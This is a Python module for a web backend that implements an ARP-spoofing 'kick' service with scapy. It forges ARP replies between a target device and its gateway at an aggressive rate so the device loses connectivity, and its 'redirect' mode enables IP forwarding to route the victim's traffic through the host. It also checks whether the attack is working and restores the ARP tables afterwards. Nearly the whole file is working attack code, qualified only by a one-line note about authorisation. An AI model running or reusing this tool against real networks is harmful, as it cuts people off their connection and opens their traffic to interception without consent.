"""
ARP-spoofing based "kick" service.

Why ARP spoofing rather than per-router admin APIs:
    A user authenticated to *our* app shouldn't need to know the model, vendor,
    or admin password of the gateway they're sitting behind. ARP poisoning
    works against every consumer router (TP-Link, ASUS, Huawei, Mikrotik
    home, Xiaomi, AIS, True, 3BB ONT, ...) because the router is never
    involved — we poison the target's ARP cache so its outbound traffic is
    sent to our MAC, and we drop it (or forward it, depending on mode).

Hardening over the original implementation:
    1. Interface auto-detected per-target via the routing table (was: scapy's
       arbitrary `conf.iface`, which often picked the wrong NIC on
       wifi+ethernet hosts).
    2. Gateway IP+MAC resolved with retries; falls back to ARP cache.
    3. Strict IP/MAC validation & normalization (rejects garbage before we
       send forged packets to the network).
    4. Aggressive cadence (≈5 packets/sec) plus broadcast variants —
       overrides legitimate gratuitous-ARP traffic and works even when the
       target hasn't ARP-resolved us yet.
    5. Restore phase sends BOTH unicast and broadcast corrections so neighbour
       switches refresh their tables; sent multiple times.
    6. Liveness probe (ping every 5 s) reports whether the kick is actually
       cutting the device off (a busy router with DAI / port-security will
       silently absorb forged ARPs — without this you'd never know).
    7. Pre-flight: warns if not root / Npcap missing.
    8. Non-interactive sudo for IP forwarding (won't hang the FastAPI worker
       on a password prompt).

NOTE: This is intended for use on networks you own / administer. ARP
poisoning third-party networks without authorisation is illegal in most
jurisdictions.
"""

from __future__ import annotations

import ipaddress
import logging
import os
import platform
import re
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

from scapy.all import (
    ARP,
    Ether,
    conf,
    get_if_hwaddr,
    sendp,
    srp,
)

logger = logging.getLogger(__name__)

# --- module-wide state -----------------------------------------------------
_active_kicks: dict[str, "_KickState"] = {}
_lock = threading.Lock()

# Background "is this kick still working?" sampler runs at this cadence.
LIVENESS_INTERVAL_SEC = 5.0
# How fast to flood ARP replies. 5/s is enough to beat the typical 30s gateway
# refresh without flooding the LAN.
SPOOF_INTERVAL_SEC = 0.2
# How many corrective packets we send during restore.
RESTORE_BURST = 8


_MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$")
_BROADCAST = "ff:ff:ff:ff:ff:ff"


@dataclass
class _KickState:
    target_ip: str
    target_mac: str
    gw_ip: str
    gw_mac: str
    iface: str
    local_mac: str
    mode: str
    stop_event: threading.Event = field(default_factory=threading.Event)
    thread: Optional[threading.Thread] = None
    liveness_thread: Optional[threading.Thread] = None
    # last result of the liveness probe — True means target is unreachable
    # (kick is effective), False means target is still up.
    effective: bool = False
    started_at: float = field(default_factory=time.time)


# --- helpers ---------------------------------------------------------------
def _ping_once(ip: str, timeout: float = 1.0) -> bool:
    """Send one ICMP echo, return True if it gets a reply."""
    try:
        if platform.system() == "Darwin" or platform.system() == "Linux":
            r = subprocess.run(
                ["ping", "-c", "1", "-W", str(int(timeout * 1000)), ip]
                if platform.system() == "Linux"
                else ["ping", "-c", "1", "-t", str(int(timeout)), ip],
                capture_output=True,
                timeout=timeout + 1.0,
            )
            return r.returncode == 0
        else:  # Windows
            r = subprocess.run(
                ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip],
                capture_output=True,
                timeout=timeout + 1.0,
            )
            return r.returncode == 0
    except Exception:
        return False


def normalize_mac(mac: str) -> Optional[str]:
    """Lower-case + colon-separated, validated. Returns None for invalid."""
    if not isinstance(mac, str):
        return None
    cleaned = mac.strip().lower().replace("-", ":")
    if not _MAC_RE.match(cleaned):
        return None
    # Normalize single-digit segments like "a:b:c:d:e:f"
    return ":".join(p.zfill(2) for p in cleaned.split(":"))


def validate_ip(ip: str) -> Optional[str]:
    """Return canonical IPv4 string or None for invalid / non-private targets we shouldn't poison."""
    try:
        addr = ipaddress.IPv4Address(ip.strip())
    except (ipaddress.AddressValueError, AttributeError):
        return None
    # Refuse to spoof loopback / multicast / broadcast / link-local — these
    # would either crash the LAN or have no effect.
    if addr.is_loopback or addr.is_multicast or addr.is_unspecified:
        return None
    if str(addr) == "255.255.255.255":
        return None
    return str(addr)


def _set_ip_forwarding(enable: bool) -> None:
    """
    Best-effort enable/disable IP forwarding. We use `sudo -n` so that if the
    process isn't allowed passwordless sudo we fail fast without hanging on a
    password prompt. On Linux we also try writing /proc directly when running
    as root.
    """
    value = "1" if enable else "0"
    system = platform.system()
    try:
        if system == "Linux":
            # Try direct write first — works when uvicorn runs as root and
            # doesn't depend on sudo configuration.
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write(value)
                logger.info("IP forwarding set to %s via /proc", enable)
                return
            except PermissionError:
                pass
            subprocess.run(
                ["sudo", "-n", "sysctl", "-w", f"net.ipv4.ip_forward={value}"],
                capture_output=True,
                timeout=3,
            )
        elif system == "Darwin":
            subprocess.run(
                ["sudo", "-n", "sysctl", "-w", f"net.inet.ip.forwarding={value}"],
                capture_output=True,
                timeout=3,
            )
        # Windows: would require netsh; skipping — we'd need admin elevation.
        logger.info("IP forwarding requested -> %s", enable)
    except subprocess.TimeoutExpired:
        logger.warning("IP forwarding toggle timed out — check sudoers config")
    except Exception as e:
        logger.warning("Failed to toggle IP forwarding: %s", e)


def _iface_for(ip: str) -> Optional[str]:
    """Find the local interface that the routing table would use for `ip`."""
    try:
        # scapy's route lookup returns (iface, our_ip, gateway_ip).
        iface, _our_ip, _gw = conf.route.route(ip)
        if iface and iface != "lo" and iface != "lo0":
            return iface
    except Exception as e:
        logger.warning("route lookup for %s failed: %s", ip, e)
    return None


def _resolve_mac(ip: str, iface: str, timeout: float = 2.0, retries: int = 3) -> Optional[str]:
    """ARP-resolve `ip` on `iface`. Returns lowercase colon-separated MAC."""
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst=_BROADCAST) / ARP(pdst=ip),
                timeout=timeout,
                iface=iface,
                verbose=False,
                retry=0,
            )
            if ans:
                return ans[0][1].hwsrc.lower()
        except Exception as e:
            logger.warning("ARP probe %s on %s attempt %d failed: %s", ip, iface, attempt + 1, e)
        time.sleep(0.3)

    # Fallback: read OS ARP cache (which would have been populated by a recent scan).
    try:
        out = subprocess.run(
            ["arp", "-n", ip] if platform.system() == "Linux" else ["arp", ip],
            capture_output=True,
            text=True,
            timeout=2,
        ).stdout
        m = re.search(r"([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5})", out)
        if m:
            return normalize_mac(m.group(1))
    except Exception:
        pass
    return None


def _get_default_gateway() -> tuple[Optional[str], Optional[str]]:
    """
    Find the default gateway IPv4 and the interface scapy would use.
    Returns (gw_ip, iface). Either can be None on failure.
    """
    try:
        iface, _our_ip, gw_ip = conf.route.route("0.0.0.0")
        if gw_ip and gw_ip != "0.0.0.0":
            return gw_ip, iface
    except Exception as e:
        logger.warning("default gw lookup failed: %s", e)
    return None, None


def _preflight_check() -> Optional[str]:
    """Returns None if everything looks usable, else a human-readable warning."""
    # On Unix, raw sockets need root. Don't actually block — some setups grant
    # CAP_NET_RAW to a non-root user — but warn loudly so the user knows what
    # to do when packets don't go anywhere.
    if platform.system() in ("Linux", "Darwin"):
        if hasattr(os, "geteuid") and os.geteuid() != 0:
            return (
                "Process is not running as root — ARP spoofing may silently fail. "
                "Run the backend with sudo, or grant CAP_NET_RAW."
            )
    if platform.system() == "Windows":
        try:
            # scapy needs Npcap on modern Windows.
            from scapy.arch.windows import get_windows_if_list  # type: ignore
            ifs = get_windows_if_list()
            if not ifs:
                return "No network interfaces detected — is Npcap installed?"
        except Exception:
            return "scapy/Npcap not available on this Windows host."
    return None


# --- core spoof loop -------------------------------------------------------
def _poison_loop(state: _KickState) -> None:
    """Send forged ARP replies until stop_event is set."""
    try:
        # Forge: "I am the gateway" → sent to target.
        pkt_to_target_unicast = (
            Ether(src=state.local_mac, dst=state.target_mac)
            / ARP(
                op=2,
                pdst=state.target_ip,
                hwdst=state.target_mac,
                psrc=state.gw_ip,
                hwsrc=state.local_mac,
            )
        )
        # Broadcast variant — useful when target's ARP table doesn't yet
        # contain an entry for the gateway, or for switches that filter
        # by destination MAC.
        pkt_to_target_bcast = (
            Ether(src=state.local_mac, dst=_BROADCAST)
            / ARP(
                op=2,
                pdst=state.target_ip,
                hwdst=_BROADCAST,
                psrc=state.gw_ip,
                hwsrc=state.local_mac,
            )
        )
        # Forge: "I am the target" → sent to gateway, so return traffic also gets misdirected.
        pkt_to_gw_unicast = (
            Ether(src=state.local_mac, dst=state.gw_mac)
            / ARP(
                op=2,
                pdst=state.gw_ip,
                hwdst=state.gw_mac,
                psrc=state.target_ip,
                hwsrc=state.local_mac,
            )
        )
        pkt_to_gw_bcast = (
            Ether(src=state.local_mac, dst=_BROADCAST)
            / ARP(
                op=2,
                pdst=state.gw_ip,
                hwdst=_BROADCAST,
                psrc=state.target_ip,
                hwsrc=state.local_mac,
            )
        )

        logger.info(
            "ARP spoofing started: target=%s (%s) gw=%s (%s) iface=%s mode=%s",
            state.target_ip, state.target_mac, state.gw_ip, state.gw_mac, state.iface, state.mode,
        )
        _set_ip_forwarding(enable=(state.mode == "redirect"))

        while not state.stop_event.is_set():
            try:
                sendp(
                    [pkt_to_target_unicast, pkt_to_target_bcast,
                     pkt_to_gw_unicast, pkt_to_gw_bcast],
                    iface=state.iface,
                    verbose=False,
                )
            except Exception as e:
                # Don't die on transient send errors — log and keep trying.
                logger.warning("send error in poison loop: %s", e)
            state.stop_event.wait(SPOOF_INTERVAL_SEC)

    except Exception as e:
        logger.exception("Poison loop crashed for %s: %s", state.target_ip, e)
    finally:
        _restore(state)
        if state.mode == "redirect":
            _set_ip_forwarding(enable=False)


def _restore(state: _KickState) -> None:
    """Send corrected ARPs so the target and gateway recover normal communication."""
    try:
        # Tell target the real gateway MAC.
        fix_target = (
            Ether(dst=state.target_mac) / ARP(
                op=2,
                pdst=state.target_ip,
                hwdst=state.target_mac,
                psrc=state.gw_ip,
                hwsrc=state.gw_mac,
            )
        )
        fix_target_bcast = (
            Ether(dst=_BROADCAST) / ARP(
                op=2,
                pdst=state.target_ip,
                hwdst=_BROADCAST,
                psrc=state.gw_ip,
                hwsrc=state.gw_mac,
            )
        )
        # Tell gateway the real target MAC.
        fix_gw = (
            Ether(dst=state.gw_mac) / ARP(
                op=2,
                pdst=state.gw_ip,
                hwdst=state.gw_mac,
                psrc=state.target_ip,
                hwsrc=state.target_mac,
            )
        )
        fix_gw_bcast = (
            Ether(dst=_BROADCAST) / ARP(
                op=2,
                pdst=state.gw_ip,
                hwdst=_BROADCAST,
                psrc=state.target_ip,
                hwsrc=state.target_mac,
            )
        )
        sendp(
            [fix_target, fix_target_bcast, fix_gw, fix_gw_bcast],
            iface=state.iface,
            count=RESTORE_BURST,
            inter=0.2,
            verbose=False,
        )
        logger.info("Restored ARP for %s on %s", state.target_ip, state.iface)
    except Exception as e:
        logger.warning("restore failed for %s: %s", state.target_ip, e)


def _liveness_loop(state: _KickState) -> None:
    """Sample target reachability. Records whether the kick is effective."""
    while not state.stop_event.is_set():
        # 3 pings; if NONE reply, the kick is working.
        any_reply = False
        for _ in range(3):
            if state.stop_event.is_set():
                return
            if _ping_once(state.target_ip, timeout=1.0):
                any_reply = True
                break
        state.effective = not any_reply
        state.stop_event.wait(LIVENESS_INTERVAL_SEC)


# --- public API ------------------------------------------------------------
def start_kick(target_ip: str, target_mac: str, mode: str = "kick") -> dict:
    """
    Begin spoofing `target_ip` (and its associated MAC). Returns a status
    dict suitable for sending to the client.

    Raises ValueError on input/preflight problems so the route layer can
    surface a 4xx instead of a generic 500.
    """
    ip = validate_ip(target_ip)
    if not ip:
        raise ValueError(f"Invalid or unsupported target IP: {target_ip!r}")

    tmac = normalize_mac(target_mac)
    if not tmac:
        raise ValueError(f"Invalid target MAC: {target_mac!r}")

    if mode not in ("kick", "redirect"):
        raise ValueError(f"Unknown mode {mode!r} (expected 'kick' or 'redirect')")

    warning = _preflight_check()

    iface = _iface_for(ip)
    if not iface:
        raise ValueError(
            "Could not determine which interface to use for this target — "
            "is the device on a network you're connected to?"
        )

    try:
        local_mac = get_if_hwaddr(iface).lower()
    except Exception as e:
        raise ValueError(f"Could not read local MAC for {iface}: {e}")

    if local_mac == tmac:
        raise ValueError("Refusing to spoof our own MAC address.")

    # Resolve the gateway.
    gw_ip, gw_iface = _get_default_gateway()
    if not gw_ip:
        raise ValueError("No default gateway found. Is the host connected to a network?")
    # If the gateway is on a different interface than the target, the target
    # isn't routed through it — refuse rather than send garbage.
    if gw_iface and gw_iface != iface:
        raise ValueError(
            f"Target {ip} routes via {iface} but the default gateway is on {gw_iface} — "
            "cross-interface kicks aren't supported."
        )
    gw_mac = _resolve_mac(gw_ip, iface)
    if not gw_mac:
        raise ValueError(f"Could not ARP-resolve gateway {gw_ip} on {iface}.")

    with _lock:
        existing = _active_kicks.get(ip)
        if existing:
            if existing.mode == mode and existing.thread and existing.thread.is_alive():
                return _status_dict(existing, warning, message="already active")
            # Mode change or dead thread — stop the old one and recreate.
            existing.stop_event.set()
            _active_kicks.pop(ip, None)

        state = _KickState(
            target_ip=ip,
            target_mac=tmac,
            gw_ip=gw_ip,
            gw_mac=gw_mac,
            iface=iface,
            local_mac=local_mac,
            mode=mode,
        )
        state.thread = threading.Thread(target=_poison_loop, args=(state,), daemon=True)
        state.liveness_thread = threading.Thread(target=_liveness_loop, args=(state,), daemon=True)
        _active_kicks[ip] = state
        state.thread.start()
        state.liveness_thread.start()

    return _status_dict(state, warning, message="started")


def stop_kick(target_ip: str) -> dict:
    """Stop a kick if active. Returns whether anything was actually stopped."""
    ip = validate_ip(target_ip)
    if not ip:
        raise ValueError(f"Invalid target IP: {target_ip!r}")

    with _lock:
        state = _active_kicks.pop(ip, None)

    if not state:
        return {"ip": ip, "stopped": False, "message": "no active kick"}

    state.stop_event.set()
    # Wait briefly for clean restoration so the caller can rely on it.
    if state.thread:
        state.thread.join(timeout=2.0)
    return {"ip": ip, "stopped": True, "message": "released"}


def stop_all_kicks() -> int:
    """Best-effort: stop every active kick (used at shutdown)."""
    with _lock:
        items = list(_active_kicks.items())
        _active_kicks.clear()
    for _ip, state in items:
        state.stop_event.set()
    for _ip, state in items:
        if state.thread:
            state.thread.join(timeout=1.5)
    return len(items)


def get_active_kicks() -> list[dict]:
    """Snapshot of all active kicks with effectiveness info."""
    with _lock:
        # Filter out dead threads while we have the lock.
        dead = [ip for ip, s in _active_kicks.items() if s.thread and not s.thread.is_alive()]
        for ip in dead:
            _active_kicks.pop(ip, None)
        return [_status_dict(s) for s in _active_kicks.values()]


def _status_dict(state: _KickState, warning: Optional[str] = None, message: Optional[str] = None) -> dict:
    out = {
        "ip": state.target_ip,
        "mac": state.target_mac,
        "mode": state.mode,
        "iface": state.iface,
        "gateway": state.gw_ip,
        "effective": state.effective,
        "uptime_sec": round(time.time() - state.started_at, 1),
    }
    if warning:
        out["warning"] = warning
    if message:
        out["message"] = message
    return out
